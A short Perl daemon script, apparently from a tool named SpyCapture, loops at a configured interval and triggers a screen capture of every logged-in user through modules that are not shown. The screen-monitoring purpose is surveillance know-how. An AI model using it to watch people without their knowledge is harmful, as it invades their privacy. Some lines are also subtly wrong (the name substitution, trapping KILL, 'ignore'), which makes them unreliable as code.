#!/usr/bin/perl

BEGIN {
    unshift @INC, '/usr/local/spycapture/lib';
}

use strict;
use POSIX;
use File::Pid;

use SpyCapture::Core	 ();
use SpyCapture::Utils	 ();
use SpyCapture::Config   ();


my $capture = SpyCapture::Core->new();
my $config  = SpyCapture::Config->new()->init();


my $app_name = $0 =~ s/\.[^.]+$//;
my $dieNow   = '0';

$SIG{'KILL'} = $SIG{QUIT} = $SIG{INT} = $SIG{TERM} = $SIG{HUP} = \&signalHandler;
$SIG{PIPE} = 'ignore';

until ($dieNow) {
  &screen_capture();
  sleep($config->{delay_time});
}


sub screen_capture {
  my @users = SpyCapture::Utils::get_logined_users();
  if(scalar(@users)) {
    foreach my $user (@users) {
      $capture->run($user);
    }
  }
}

sub signalHandler {
  $dieNow = '1';
}
